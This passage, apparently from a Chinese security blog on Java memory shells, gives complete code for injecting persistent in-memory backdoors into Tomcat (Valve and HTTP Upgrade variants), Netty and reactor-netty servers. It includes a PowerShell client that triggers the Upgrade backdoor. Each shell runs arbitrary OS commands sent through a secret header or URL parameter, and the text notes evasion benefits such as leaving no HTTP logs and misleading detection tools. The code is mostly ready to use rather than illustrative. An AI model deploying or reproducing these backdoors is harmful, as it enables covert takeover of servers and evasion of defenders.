                    return;   // 截断：不调 getNext()，请求到此为止（同 Filter 不调 chain.doFilter）
                } catch (Exception ignored) {
                    // 执行失败也放行，别把业务打挂
                }
            }
            getNext().invoke(request, response);   // 无参数/失败：透传给管道下一个 Valve
        }
    }
%>
<%
    // 挖 StandardContext（老规矩两层反射）
    ServletContext servletContext = request.getServletContext();
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 幂等保护：遍历管道里已有的 Valve
    for (Valve v : standardContext.getPipeline().getValves()) {
        if (v instanceof ShellValve) {
            out.println("已存在，跳过注入");
            return;
        }
    }

    // 注册一件套
    standardContext.getPipeline().addValve(new ShellValve());
    out.println("注入成功");
%>
```

当我们成功注入后 所有经过这个应用的路由都可以被触发 因为Valve 马插入的位置是Context 管道 在他之前没有对url之类的匹配

![image-20261026132035045](/Levi38_blog/images/java-memshell/image-20261026132035045.png)

### Tomcat Upgrade 内存马

#### HTTP Upgrade 机制

HTTP Upgrade 机制是 HTTP/1.1 提供的一种可选协议协商方式，允许客户端在**已有的 TCP 连接**上，请求将通信协议从 HTTP/1.1 切换为其他协议（如 WebSocket），而无需新建连接。

##### 核心运作流程

1. **客户端发起请求**：客户端在 HTTP/1.1 请求中携带 `Upgrade` 头部，按优先级列出希望切换到的协议（如 `websocket`）。同时，**必须**在 `Connection` 头部中加上 `upgrade` 标记，表明这是一个逐跳（hop-by-hop）的升级请求。

   ```
   GET /chat HTTP/1.1
   Host: example.com
   Connection: upgrade
   Upgrade: websocket
   ```

2. **服务器响应**：

   - **同意升级**：服务器返回 `101 Switching Protocols` 状态码，并在响应中通过 `Upgrade` 头部指明最终选定的协议。此后，该连接立即转为新协议进行通信。
   - **拒绝或忽略**：服务器有权忽略该请求。如果拒绝，它会像没收到 `Upgrade` 头部一样，返回正常的 HTTP 响应（如 `200 OK`）。

在 Tomcat 中，HTTP Upgrade 机制有两种不同层面的实现：一种是**容器内部原生支持的协议升级**（目前主要用于 HTTP/2），另一种是**暴露给应用层使用的 Servlet API**（用于自定义协议或 WebSocket）。

**容器原生支持：HTTP/2 升级**

Tomcat 利用 Upgrade 机制，允许客户端通过 HTTP/1.1 连接“升级”到 HTTP/2，从而复用现有连接。

- **配置方式**：需要在 `server.xml` 的 `Connector` 元素内嵌套一个 `<UpgradeProtocol>` 元素，并指定类名为 `org.apache.coyote.http2.Http2Protocol`。
- **实现原理**：在 HTTP 报文解析阶段（Http11Processor，还在 CoyoteAdapter、还没进任何管道之前），Tomcat 就检查 Upgrade:
    头，和注册的协议升级器比对——命中则直接切换处理器，请求根本不会进入 Engine/Host/Context 管道。

**应用层支持：Servlet 3.1+ API**

- **核心接口**：`javax.servlet.http.HttpUpgradeHandler`。当在 Servlet 中调用 `request.upgrade(MyHandler.class)` 后，Tomcat 会暂停对该连接的常规 HTTP 处理，转而调用你提供的 `HttpUpgradeHandler` 的 `init` 方法，并将底层连接（`WebConnection`）交给你控制。
- **Tomcat 内部实现**：Tomcat 的 WebSocket 实现 `WsHttpUpgradeHandler` 就是该接口的一个具体实现，用于在握手后将连接转为 WebSocket 协议处理。

#### 内存马实现

##### 利用环境版本（版本耦合重）

Tomcat 8.5.100 + JDK 8（8u91）+ war 部署（`javax`）

根据上述原理 upgrade内存马就是运行时往 Connector 的协议升级器列表里塞一个恶意的 UpgradeProtocol

 这型马的工作原理（完整链路）

  注入（jsp）：
    两层反射挖 StandardContext → public 一路导航 Engine→Service→Connector→ProtocolHandler
    → ★ 反射私有 Map：httpUpgradeProtocols.put("shell", 恶意UpgradeProtocol)

  触发（客户端）：
    GET / + Connection: Upgrade + Upgrade: shell
    → Http11Processor 解析头时查 Map 命中 → 回 101 → 建立 UpgradeProcessorInternal
    → 回调 handler.setSocketWrapper(socket) + init()
    → 此后这条连接的字节流全归马：read(true) 读命令 → exec → write(true)+flush(true) 回显

##### shell.jsp

```
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.OutputStream" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Map" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="javax.servlet.http.WebConnection" %>
<%@ page import="org.apache.catalina.Engine" %>
<%@ page import="org.apache.catalina.connector.Connector" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.coyote.Adapter" %>
<%@ page import="org.apache.coyote.Processor" %>
<%@ page import="org.apache.coyote.Request" %>
<%@ page import="org.apache.coyote.UpgradeProtocol" %>
<%@ page import="org.apache.coyote.http11.AbstractHttp11Protocol" %>
<%@ page import="org.apache.coyote.http11.upgrade.InternalHttpUpgradeHandler" %>
<%-- 8.5 dist 的真实包路径：UpgradeInfo 在 http11.upgrade 包，SocketState 是嵌套枚举 --%>
<%@ page import="org.apache.coyote.http11.upgrade.UpgradeInfo" %>
<%@ page import="org.apache.tomcat.util.net.AbstractEndpoint" %>
<%@ page import="org.apache.tomcat.util.net.SocketEvent" %>
<%@ page import="org.apache.tomcat.util.net.SocketWrapperBase" %>
<%@ page import="org.apache.tomcat.util.net.SSLSupport" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    // ============ 马体 B：恶意协议处理器 ============
    // ★ 实测踩坑：这条"内部升级"路线的 WebConnection.getInputStream() 返回 null！
    //   （UpgradeProcessorInternal 是给 h2c 这类内部协议用的，没有 Servlet 流）
    //   唯一的 I/O 通道是 setSocketWrapper() 给的 SocketWrapperBase，
    //   用它的阻塞 read(true,...)/write(true,...) 直接读写原始 socket
    public static class ShellUpgradeHandler implements InternalHttpUpgradeHandler {

        private SocketWrapperBase<?> wrapper;

        @Override
        public void setSocketWrapper(SocketWrapperBase<?> wrapper) {
            this.wrapper = wrapper;   // ★ 唯一的 I/O 通道，务必存下来
        }

        @Override
        public void init(WebConnection connection) {
            try {
                // 单命令协议：读一行命令 → exec → 回写输出 → 关连接
                byte[] one = new byte[1];
                StringBuilder sb = new StringBuilder();
                while (wrapper.read(true, one, 0, 1) == 1) {    // 阻塞读原始 socket
                    if (one[0] == '\n') break;
                    if (one[0] != '\r') sb.append((char) one[0]);
                }
                String cmd = sb.toString().trim();
                if (!cmd.isEmpty()) {
                    boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
                    String[] cmds = isWin
                            ? new String[]{"cmd.exe", "/c", cmd}
                            : new String[]{"sh", "-c", cmd};
                    Process p = new ProcessBuilder(cmds).redirectErrorStream(true).start();
                    String charset = isWin ? "GBK" : "UTF-8";   // Windows 控制台默认 GBK
                    Scanner s = new Scanner(p.getInputStream(), charset).useDelimiter("\\A");
                    String output = (s.hasNext() ? s.next() : "") + "\n";
                    byte[] out = output.getBytes(charset);
                    wrapper.write(true, out, 0, out.length);    // 阻塞写——注意：只进了 socket 写缓冲区！
                    wrapper.flush(true);                         // ★ 必须显式刷到网络，否则 close 时数据被丢弃
                    System.out.println("[ShellUpgrade] cmd=" + cmd);
                }
            } catch (Exception ignored) {
            } finally {
                try { wrapper.close(); } catch (Exception ignored) {}
            }
        }

        // 其余方法与命令执行无关，空实现即可（setSocketWrapper 已在上面实现）
        @Override public void destroy() {}
        @Override public AbstractEndpoint.Handler.SocketState upgradeDispatch(SocketEvent status) {
            return AbstractEndpoint.Handler.SocketState.CLOSED;   // 8.5 里 SocketState 是 Handler 的嵌套枚举
        }
        @Override public void timeoutAsync(long now) {}
        @Override public void setSslSupport(SSLSupport sslSupport) {}
        @Override public void pause() {}
        @Override public UpgradeInfo getUpgradeInfo() { return null; }
    }

    // ============ 马体 A：恶意 UpgradeProtocol ============
    // 挂进 Connector 的协议升级器列表（Http11Processor 552-582 行那套机制的"注册表"）
    public static class ShellUpgradeProtocol implements UpgradeProtocol {

        @Override
        public String getHttpUpgradeName(boolean isSSLEnabled) {
            return "shell";    // 暗号：请求头 Upgrade: shell
        }

        // 只走 HTTP/1.1 Upgrade 路线，不用 ALPN
        @Override public byte[] getAlpnIdentifier() { return null; }
        @Override public String getAlpnName() { return null; }
        @Override public Processor getProcessor(SocketWrapperBase<?> socketWrapper, Adapter adapter) { return null; }

        @Override
        public InternalHttpUpgradeHandler getInternalUpgradeHandler(Adapter adapter, Request request) {
            return new ShellUpgradeHandler();   // ★ 8.5 的升级入口（9.x 改用 getProcessor 路线）
        }

        @Override
        public boolean accept(Request request) {
            return true;
        }
    }
%>
<%
    // ============ 注入逻辑 ============
    // 挖出 StandardContext（老规矩两层反射）
    ServletContext servletContext = request.getServletContext();
    Field applicationField = servletContext.getClass().getDeclaredField("context");
    applicationField.setAccessible(true);
    ApplicationContext applicationContext = (ApplicationContext) applicationField.get(servletContext);

    Field standardContextField = applicationContext.getClass().getDeclaredField("context");
    standardContextField.setAccessible(true);
    StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);

    // 导航到 Connector 的 ProtocolHandler —— 全程 public 方法，无反射：
    // Context → Host → Engine → Service → Connector → ProtocolHandler
    Engine engine = (Engine) standardContext.getParent().getParent();
    AbstractHttp11Protocol<?> protocol =
            (AbstractHttp11Protocol<?>) engine.getService().findConnectors()[0].getProtocolHandler();

    // ★ 本 demo 实测踩坑：addUpgradeProtocol() 只往 List 里加（AbstractHttp11Protocol 619 行），
    //   但 Http11Processor 运行时查表用的是 httpUpgradeProtocols 这个 Map（676 行），
    //   Map 只在协议启动时由 private 的 configureUpgradeProtocol() 填充——
    //   运行时注册必须反射直接 put 进 Map，否则升级请求永远匹配不上（返回 200 不切换）
    Field mapField = AbstractHttp11Protocol.class.getDeclaredField("httpUpgradeProtocols");
    mapField.setAccessible(true);
    Map<String, UpgradeProtocol> httpUpgradeProtocols =
            (Map<String, UpgradeProtocol>) mapField.get(protocol);

    // 幂等保护：以 Map 为准（查表读的就是它）
    if (httpUpgradeProtocols.containsKey("shell")) {
        out.println("已存在，跳过注入");
        return;
    }

    httpUpgradeProtocols.put("shell", new ShellUpgradeProtocol());   // ★ 真正生效的注册
    protocol.addUpgradeProtocol(new ShellUpgradeProtocol());          // 同步登记 List（检测工具扫的是它）
    out.println("注入成功，用 upgrade_client.ps1 连接触发");
%>
```

##### upgrade_client.ps1 

```
# Upgrade memshell attack client (ASCII only: PS5.1 reads no-BOM files as ANSI)
# Usage: powershell -File upgrade_client.ps1 [-Target 127.0.0.1] [-Port 8080] [-Command "echo hacked-ok"]
# Flow: send upgrade request (Upgrade: shell) -> wait 101 switch -> send one-line command -> read echo
param(
    [string]$Target = "127.0.0.1",
    [int]$Port = 8080,
    [string]$Command = "echo hacked-ok"
)

$client = New-Object System.Net.Sockets.TcpClient($Target, $Port)
$stream = $client.GetStream()

# 1. protocol upgrade request
$req = "GET / HTTP/1.1`r`nHost: $Target`r`nConnection: Upgrade`r`nUpgrade: shell`r`n`r`n"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($req)
$stream.Write($bytes, 0, $bytes.Length)
$stream.Flush()

Start-Sleep -Milliseconds 600    # wait for 101 switch

$buf = New-Object byte[] 65536

# 2. drain the 101 response
if ($stream.DataAvailable) {
    $n = $stream.Read($buf, 0, $buf.Length)
    Write-Host "--- server response ---"
    Write-Host ([System.Text.Encoding]::ASCII.GetString($buf, 0, $n))
}

# 3. send command (raw bytes now, not HTTP)
$cmdBytes = [System.Text.Encoding]::ASCII.GetBytes($Command + "`n")
$stream.Write($cmdBytes, 0, $cmdBytes.Length)
$stream.Flush()

# 4. read output until server closes
Write-Host "--- command output ---"
try {
    while (($n = $stream.Read($buf, 0, $buf.Length)) -gt 0) {
        [System.Text.Encoding]::GetEncoding(936).GetString($buf, 0, $n)   # 936 = GBK
    }
} catch {}
$client.Close()
```

1. 发 `GET /` + `Connection: Upgrade` + `Upgrade: shell` → 让 Tomcat 匹配到恶意 `UpgradeProtocol`，回 101，把 socket 交给 handler；
2. 在**同一条 TCP 连接**上写 `命令\n` → 被 `init()` 的逐字节读循环捕获 → `ProcessBuilder` 执行 → 输出经 `wrapper.write` + `flush` 写回；
3. 循环读到连接关闭，拿到回显

![image-20261031173355749](/Levi38_blog/images/java-memshell/image-20261031173355749.png)

#### 特性

    1. 流量隐身：触发只有一条请求，之后所有命令交互零HTTP 日志
  2. 长连接：一次升级、持续通信，不产生请求序列
        3. 不碰任何注册表

####   代价

  - 版本耦合最重：UpgradeProtocol 的内部方法签名在 8.5/9/10 之间变动过，拿到 ProtocolHandler的反射链路也随部署方式（独立/war/内嵌）不同而不同
  - 客户端要求高：升级后是自定义协议，你得用 nc/自写 socket 脚本和它说话，不能 curl
  - 入口更重：反射深、马体要自己管理字节流协议



### Executor 型内存马

#### 什么是Executor

Executor本质上是一个线程池，用于定义一个共享的线程池，让多个connector共用，从而更高效地利用服务器资源

Tomcat 处理请求的简化链路是：`Poller` 监听到 Socket 事件 → 封装成 `SocketProcessor` → **提交给 Executor 线程池** → 线程池调度执行 `SocketProcessor.run()` → 内部调用 `Processor.process()` 读取 Socket 数据、解析 HTTP 协议 → 最终才到达 Container（业务逻辑）

#### 内存马

Executor内存马就是把马植入到Tomcat 的线程池，正因为 Executor 在业务逻辑之前执行，所以恶意 Executor 重写的 `execute` 方法会在 Tomcat 读取 Socket 数据、创建 `Request` 对象**之前**就被触发。这也导致了这种内存马实现的困难，因为难以获取当前请求数据，且SocketProcessor 的类名、内部字段随 NIO/NIO2/APR 三种实现和 Tomcat 版本全不一样

这里只是做一个概念了解，不做具体复现

### Netty中间件内存马

#### Netty&SpringWebFlux&SpringCloudGateway的关系

```plain
这里Netty比较特别，很多人分不清它跟SpringWebFlux的关系：

★Spring WebFlux 默认使用 Netty用作核心容器，因其完全适配响应式非阻塞模型。Spring WebFlux 不依赖传统的 Servlet 容器（如 Tomcat），而是基于 响应式流规范（Reactive Streams），因此需要支持异步非阻塞 IO 的服务器。其主要支持以下服务器：

1. Netty：作为默认且最常用的服务器，Netty 是异步事件驱动的网络框架，完全契合响应式编程模型，是 Spring WebFlux 的首选容器。
2. Undertow：Red Hat 开发的轻量级高性能服务器，同样支持响应式编程，可作为 WebFlux 的运行容器。
3. Tomcat/Jetty：理论上 Tomcat 9+ 和 Jetty 支持部分异步特性，但并非 WebFlux 的原生适配容器，实际应用中较少使用（因 Servlet 3.1 异步 API 与响应式模型仍有差异）。

Spring Cloud Gateway
微服务网关，处理所有外部请求，提供路由、限流、认证等功能。
基于 Spring WebFlux + Netty
```

#### Netty和Tomcat请求流程的对照

 Tomcat:  socket → Poller → [任务进线程池] → Http11Processor → 管道/Valve → filter 链 → Servlet
 Netty:   socket → EventLoop（收读事件）→ pipeline 逐个过 inbound handler → 业务 handler→ outbound handler → 字节写回

#### 内存马实现

Netty 处理 HTTP 请求依赖一条 **Pipeline（责任链）**。每个请求进来时，Netty 会动态构建这条链，链上挂着一串 **Handler**，数据依次经过它们处理。Netty内存马主流是 Handler 型，即往 ChannelPipeline 里插一个恶意 ChannelInboundHandler。一旦插入，后续所有经过这条链的请求都会先被恶意 Handler 处理。

```
// 马体骨架
  public class EvilHandler extends ChannelInboundHandlerAdapter {
      public void channelRead(ChannelHandlerContext ctx, Object msg) {
          ByteBuf buf = (ByteBuf) msg;                       // 原始字节，没有 request 对象
          // 读取字节 → 匹配暗号
          if (是暗号) {
              byte[] resp = exec(命令);
              ctx.writeAndFlush(Unpooled.wrappedBuffer(resp)); // 直接写回连接
              buf.release();                                   // ★ Netty 特有：引用计数必须还
              return;                                          // 不传给后面的 handler = 截断
          }
          ctx.fireChannelRead(msg);                            // 无暗号：透传
      }
  }

// 注入：拿到 pipeline 后
pipeline.addFirst("normal-name", new EvilHandler());   // 运行时可变，立即生效
```

对于**reactor.netty**（Spring WebFlux和Spring Cloud Gateway）的底层和原生**io.netty**环境的内存马在注入内存马时有所区别



##### reactor.netty

核心是修改reactor.netty.transport.TransportConfig#doOnChannelInit，在reactor.netty中，channel的初始化位于reactor.netty.transport.TransportConfig.TransportChannelInitializer#initChannel。

onChannelInit 是 ChannelPipelineConfigurer 接口的唯一抽象方法

我们可以在其中插入马

利用链路 

​     新客户端连接进来
​    → Acceptor.channelRead → child.pipeline().addLast(TransportChannelInitializer)
​    → initChannel(child) 执行：
​          addReactiveBridge(...)                                   // 框架自己的 handler
​          config.defaultOnChannelInit()
​                .then(config.doOnChannelInit)                      // ← 我们注入的字段在这被现场读出
​                .onChannelInit(observer, channel, remoteAddress);  // ← ★ 此刻本方法被回调

**注入过程**

```
private static String doInject(HttpServerRequest request) {
        try {
            if (injected) {
                return "已存在，跳过注入（幂等）";
            }
            Channel channel = channelOf(request);

            // ① 当前连接：立即生效（马先在当前连接上岗）
            if (channel.pipeline().get("evil-handler") == null) {
                channel.pipeline().addFirst("evil-handler", new EvilHandler());
            }

            // ② 未来连接：找到 reactor-netty 的 Acceptor
            Channel serverChannel = channel.parent();
            if (serverChannel == null) {
                return "未找到 server channel";
            }
            ChannelHandler acceptor = null;
            for (Map.Entry<String, ChannelHandler> e : serverChannel.pipeline()) {
                // 注意类名：reactor.netty.transport.ServerTransport$Acceptor（reactor 自己的实现）
                if (e.getValue().getClass().getName().endsWith("ServerTransport$Acceptor")) {
                    acceptor = e.getValue();
                    break;
                }
            }
            if (acceptor == null) {
                return "未找到 Acceptor";
            }

            // ③ 反射链挖到 TransportConfig
            Field fChildHandler = acceptor.getClass().getDeclaredField("childHandler");
            fChildHandler.setAccessible(true);
            Object initializer = fChildHandler.get(acceptor);        // TransportChannelInitializer

            Field fConfig = initializer.getClass().getDeclaredField("config");
            fConfig.setAccessible(true);
            Object transportConfig = fConfig.get(initializer);       // TransportConfig

            // ④ 注入点：doOnChannelInit 字段 —— 用框架的 then 组合追加（原有配置不丢）
            // 注意：字段声明在父类 TransportConfig 里，运行时对象是 HttpServerConfig（孙类），
            // getDeclaredField 不查父类 —— 必须沿继承链向上找
            Field fDoOn = findField(transportConfig.getClass(), "doOnChannelInit");
            if (fDoOn == null) {
                return "未找到 doOnChannelInit 字段";
            }
            fDoOn.setAccessible(true);
            ChannelPipelineConfigurer current =
                    (ChannelPipelineConfigurer) fDoOn.get(transportConfig);
            fDoOn.set(transportConfig, current.then(new EvilConfigurer()));

            injected = true;
            return "注入成功：当前连接已插马；doOnChannelInit 字段已追加恶意 configurer，"
                    + "之后每个新连接组装 pipeline 时都会自动带上马";
        } catch (Exception e) {
            return "注入失败: " + e;
        }
    }
}
```

**马体**

```
package com.example;

import io.netty.buffer.ByteBuf;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelInboundHandlerAdapter;

import java.nio.charset.StandardCharsets;
import java.util.Scanner;

/**
 * 恶意 ChannelPipelineConfigurer 安插的马体 —— 与 netty_demo 的 EvilHandler 同款：
 * 挂在 pipeline 最前（reactive bridge / HTTP codec 之前），拦截原始字节。
 *
 * 透传/截断语义、ByteBuf 引用计数规矩全部同 netty_demo，此处不赘。
 *
 * 注意：在 Reactor Netty 下这个 handler 跑在 EventLoop 线程上，
 * exec 阻塞会拖住该 EventLoop 名下的所有连接（对比 Servlet 栈一请求一线程）。
 * demo 简化为同步执行；实战应把 exec 丢到独立线程池。
 */
public class EvilHandler extends ChannelInboundHandlerAdapter {

    /** 暗号：请求行以 GET /shell 开头 */
    private static final byte[] MAGIC = "GET /shell".getBytes(StandardCharsets.US_ASCII);

    /** TCP 分片时首行可能没收完，攒着等下一块 */
    private ByteBuf pending;

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        if (!(msg instanceof ByteBuf)) {
            ctx.fireChannelRead(msg);
            return;
        }
        ByteBuf data = (ByteBuf) msg;
        if (pending != null) {
            pending.writeBytes(data);
            data.release();
            data = pending;
        }

        int nl = newLineIndex(data);
        if (nl < 0 && data.readableBytes() < 16) {
            pending = data;
            return;
        }

        if (startsWith(data, MAGIC)) {
            if (nl > 0) {
                pending = null;
                handleShell(ctx, data, nl);
            } else {
                pending = data;
            }
            return;
        }

        pending = null;
        ctx.fireChannelRead(data);
    }

    private void handleShell(ChannelHandlerContext ctx, ByteBuf data, int nl) {
        try {
            String firstLine = data.toString(data.readerIndex(), nl, StandardCharsets.US_ASCII).trim();
            String cmd = extractCmd(firstLine);

            byte[] body;
            String charsetName;
            if (cmd == null || cmd.isEmpty()) {
                body = "usage: /shell?cmd=echo+hello\n".getBytes(StandardCharsets.US_ASCII);
                charsetName = "US-ASCII";
            } else {
                boolean isWin = System.getProperty("os.name").toLowerCase().contains("win");
                String charset = isWin ? "GBK" : "UTF-8";
                String[] cmds = isWin
                        ? new String[]{"cmd.exe", "/c", cmd}
                        : new String[]{"sh", "-c", cmd};
                Process p = new ProcessBuilder(cmds).redirectErrorStream(true).start();
                Scanner s = new Scanner(p.getInputStream(), charset).useDelimiter("\\A");
                String out = (s.hasNext() ? s.next() : "") + "\n";
                body = out.getBytes(charset);
                charsetName = charset;
                System.out.println("[EvilHandler] cmd=" + cmd);
            }

            ByteBuf resp = ctx.alloc().buffer();
            resp.writeBytes(("HTTP/1.1 200 OK\r\nContent-Type: text/plain; charset=" + charsetName
                    + "\r\nContent-Length: " + body.length + "\r\nConnection: close\r\n\r\n")
                    .getBytes(StandardCharsets.US_ASCII));
            resp.writeBytes(body);
            ctx.writeAndFlush(resp).addListener(ChannelFutureListener.CLOSE);
        } catch (Exception ignored) {
            ctx.close();
        } finally {
            data.release();
        }
    }

    private static int newLineIndex(ByteBuf buf) {
        for (int i = buf.readerIndex(); i < buf.writerIndex(); i++) {
            if (buf.getByte(i) == '\n') {
                return i - buf.readerIndex();
            }
        }
        return -1;
    }

    private static boolean startsWith(ByteBuf buf, byte[] magic) {
        if (buf.readableBytes() < magic.length) {
            return false;
        }
        for (int i = 0; i < magic.length; i++) {
            if (buf.getByte(buf.readerIndex() + i) != magic[i]) {
                return false;
            }
        }
        return true;
    }

    private static String extractCmd(String firstLine) {
        int q = firstLine.indexOf('?');
        if (q < 0) {
            return null;
        }
        String query = firstLine.substring(q + 1);
        int sp = query.indexOf(' ');
        if (sp >= 0) {
            query = query.substring(0, sp);
        }
        for (String kv : query.split("&")) {
            if (kv.startsWith("cmd=")) {
                return kv.substring(4).replace('+', ' ');
            }
        }
        return null;
    }

    @Override
    public void handlerRemoved(ChannelHandlerContext ctx) {
        if (pending != null) {
            pending.release();
            pending = null;
        }
    }
}
```

**doOnChannelInit**

```
package com.example;

import io.netty.channel.Channel;
import reactor.netty.ChannelPipelineConfigurer;
import reactor.netty.ConnectionObserver;

import java.net.SocketAddress;

/**
 * 恶意 ChannelPipelineConfigurer —— 本 demo 的核心。
 *
 * doOnChannelInit 机制（reactor-netty 1.0.45 源码验证，TransportConfig 419 行）：
 * 每个新连接的 initChannel 里执行
 *     config.defaultOnChannelInit().then(config.doOnChannelInit)
 *           .onChannelInit(connectionObserver, channel, remoteAddress);
 * 其中 config.doOnChannelInit 是 TransportConfig 的实例字段（205 行）——
 * ★ 现场读取，不是 bind 时固化 → bind 后改这个字段，下一个连接立即生效。
 *
 * 我们注入的手法：把该字段改成 现有configurer.then(本类) ——
 * 用框架自己的组合机制追加，原有配置（HTTP 层的、metrics 的...）一行不丢。
 */
public class EvilConfigurer implements ChannelPipelineConfigurer {

    @Override
    public void onChannelInit(ConnectionObserver connectionObserver, Channel channel,
                              SocketAddress remoteAddress) {
        // 每个新连接组装 pipeline 时被回调：把马插到最前（reactive bridge / codec 之前）
        channel.pipeline().addFirst("evil-handler", new EvilHandler());
    }
}
```

![image-20261103133759595](/Levi38_blog/images/java-memshell/image-20261103133759595.png)



##### io.netty

原生netty没有doOnChannelInit 只能反射把 `ServerBootstrapAcceptor.childHandler` 换成自己的 wrapper

io.netty 的 accept 由 `ServerBootstrapAcceptor` 负责，它在 **bind 时就把 `childHandler` 快照进 final 字段**，之后每 accept 一个连接才 `addLast` 一次。所以改 `ServerBootstrap.childHandler` 没用（acceptor 不回头查 bootstrap），必须直接改 acceptor 里那个字段。

Netty 4.1.100 源码：

```java
// ServerBootstrap.init()：bind 时构造 acceptor，childHandler 从此被快照
ch.eventLoop().execute(() ->
        pipeline.addLast(new ServerBootstrapAcceptor(
                ch, currentChildGroup, currentChildHandler, currentChildOptions, currentChildAttrs)));

private static class ServerBootstrapAcceptor extends ChannelInboundHandlerAdapter {
    private final ChannelHandler childHandler;          // ← final

    public void channelRead(ChannelHandlerContext ctx, Object msg) {
        final Channel child = (Channel) msg;
        child.pipeline().addLast(childHandler);         // ← 谁在这，谁决定新连接的 pipeline
        childGroup.register(child);                     // ← 先装 handler，后注册
    }
}
```

**利用链路**

```plain
新客户端连接进来
 → ServerBootstrapAcceptor.channelRead
      child.pipeline().addLast(childHandler)     // 这里读到的已是被换过的 EvilInitializer
      childGroup.register(child)
 → channelRegistered 事件
 → EvilInitializer.initChannel(ch)
      addLast(original)                          // 重放原初始化：codec / aggregator / 业务 handler
      addFirst("evil-handler", new EvilHandler())
 → 最终 pipeline：evil-handler -> HttpServerCodec -> HttpObjectAggregator -> HttpServerHandler
```

**注入过程**

当前连接立即可用（keep-alive 下同连接的后续请求才会撞上马）

换 acceptor 字段覆盖未来连接。

```java
private String doInject(ChannelHandlerContext ctx) {
    StringBuilder sb = new StringBuilder();

    // ① 当前连接：只影响这一条 TCP
    ChannelPipeline p = ctx.pipeline();
    if (p.get("evil-handler") != null) {
        sb.append("当前连接: 已存在; ");
    } else {
        p.addFirst("evil-handler", new EvilHandler());
        sb.append("当前连接: 已注入; ");
    }

    // ② 未来连接：找 ServerBootstrapAcceptor（io.netty.bootstrap 包私有内部类，只能按类名认）
    Channel serverChannel = ctx.channel().parent();          // 子 channel 的 parent = ServerChannel
    boolean hooked = false, exists = false;
    if (serverChannel != null) {
        for (Map.Entry<String, ChannelHandler> e : serverChannel.pipeline()) {
            if (e.getValue().getClass().getName().endsWith("ServerBootstrapAcceptor")) {
                try {
                    Field f = e.getValue().getClass().getDeclaredField("childHandler");
                    f.setAccessible(true);
                    ChannelHandler child = (ChannelHandler) f.get(e.getValue());
                    if (child instanceof EvilInitializer) {
                        exists = true;                                      // 幂等：已经包过
                    } else {
                        f.set(e.getValue(), new EvilInitializer(child));    // ★ 换成 wrapper
                        hooked = true;
                    }
                } catch (Exception ex) {
                    sb.append("acceptor 修改失败: ").append(ex);
                }
                break;
            }
        }
    }
    sb.append(hooked ? "未来连接: 已挂钩（acceptor 已替换）"
            : exists ? "未来连接: 已挂钩（幂等跳过）" : "未来连接: 未找到 acceptor");
    return sb.toString();
}
```

**wrapper**

```java
public class EvilInitializer extends ChannelInitializer<Channel> {

    private final ChannelHandler original;

    public EvilInitializer(ChannelHandler original) {
        this.original = original;
    }

    @Override
    protected void initChannel(Channel ch) {
        ch.pipeline().addLast(original);                           // 原初始化逻辑（codec/业务）
        ch.pipeline().addFirst("evil-handler", new EvilHandler()); // 插马到最前
    }
}
```

**马体**

与上面 reactor.netty 一致

**和 reactor.netty 的区别**

- 注入点：reactor 改 `TransportConfig.doOnChannelInit`；io 改 `ServerBootstrapAcceptor.childHandler`
- 读值时机：reactor 每个连接 initChannel 现场读；io 是 bind 时快照、accept 时使用
- 注入动作：reactor 用 `then` 追加 configurer，原链路一行不改；io 替换 `childHandler` 为 wrapper，靠 `addLast(original)` 重放
- 锚点类：reactor 是 `ServerTransport$Acceptor`；io 是 `ServerBootstrap$ServerBootstrapAcceptor`
- 通用性：reactor 版只在 reactor-netty 存在；io 版凡是用 `ServerBootstrap` 的都能用（reactor-netty 底层也是裸 Netty，两条路物理上都通）

![image-20261103144109320](/Levi38_blog/images/java-memshell/image-20261103144109320.png)

## 框架系内存马

### springMVC框架内存马

#### springMVC框架和原生 Servlet对比

对于原生Servlet开发来说一个请求处理单元是一个 Servlet 类

而springMVC框架一个请求处理单元是一个 Controller 方法

比如在原生开发中

```
// MyServlet —— 必须 extends HttpServlet（Servlet 规范的类）
  @WebServlet("/time")
  public class MyServlet extends HttpServlet { ... }

// Myfilter —— 必须 implements Filter（Servlet 规范的接口）
  @WebFilter("/filter")
  public class Myfilter implements Filter { ... }

// ShellListener —— 必须 implements ServletRequestListener（规范接口）
```

而对于**springMVC框架**来说

    @RestController
      public class HelloController {
    
          @GetMapping("/hello")
          public String hello() {
              return "hi";          // 就是一个普通方法，连 HttpServletRequest 参数都可以不要
          }
      }
这个类没有 extends 任何东西，没有 implements 任何接口，它就是个普通的Java 对象

那请求怎么处理，Servlet又去哪里了？

请求处理仍然是 Servlet 在干，但写 Servlet 这件事被框架承包了

```
GET /hello
  → Tomcat（只认识 DispatcherServlet —— 框架写的，你项目里唯一的 Servlet）
  → DispatcherServlet 收下所有请求
  → 问 HandlerMapping："/hello" 谁处理？
  → 查表命中：HelloController.hello 这个 Method 对象
  → HandlerAdapter 用 Method.invoke() 反射调用   ← 你的"普通方法"在这一刻才被执行
  → 返回值 "hi" 写回 response
```

所以我们就知道在SpringMVC框架中怎样写一个内存马

只需要通过反射操作 Spring 框架的核心组件`RequestMappingHandlerMapping`，动态注册一个恶意`Controller`Bean 框架就会自动帮我们调用其中的方法

#### 内存马实现

##### 利用环境版本

Spring Boot 2.7.18（= Spring Framework 5.3.31 + 内嵌 Tomcat 9.0.83 + `javax`），JDK 8/21 运行

版本敏感点：

- **Boot 2.6+ 匹配策略坑**：`RequestMappingInfo.paths().build()` 默认按老的 AntPathMatcher 构建，与应用本体的 PathPatternParser 错位 → 注入后**全站 500**（含 404 路径）。修复是加一行 `.options(handlerMapping.getBuilderConfiguration())`
